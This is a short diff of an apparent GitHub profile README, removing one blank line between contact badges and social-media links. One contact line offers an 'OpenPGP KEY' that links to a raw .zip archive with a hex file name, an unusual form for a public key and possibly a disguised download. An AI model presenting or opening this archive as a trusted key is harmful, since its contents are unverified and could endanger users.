@@ -16,7 +16,6 @@
   - <img src="https://img.shields.io/badge/akifmt-CC2927?logo=gmail&logoColor=white">
   - for Pretty Good Privacy(OpenPGP) [![KEY](https://img.shields.io/badge/KEY-%2307405e)](https://github.com/akifmt/akifmt/raw/main/cf5d9741a36246d6ab61df317a5c2c42.zip)
 
-
 ### 🌐 Socials:
 [![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/makiftokatlioglu) 
 [![Personal](https://img.shields.io/badge/Personal_Website-blueviolet.svg)](https://akifmt.github.io/) 
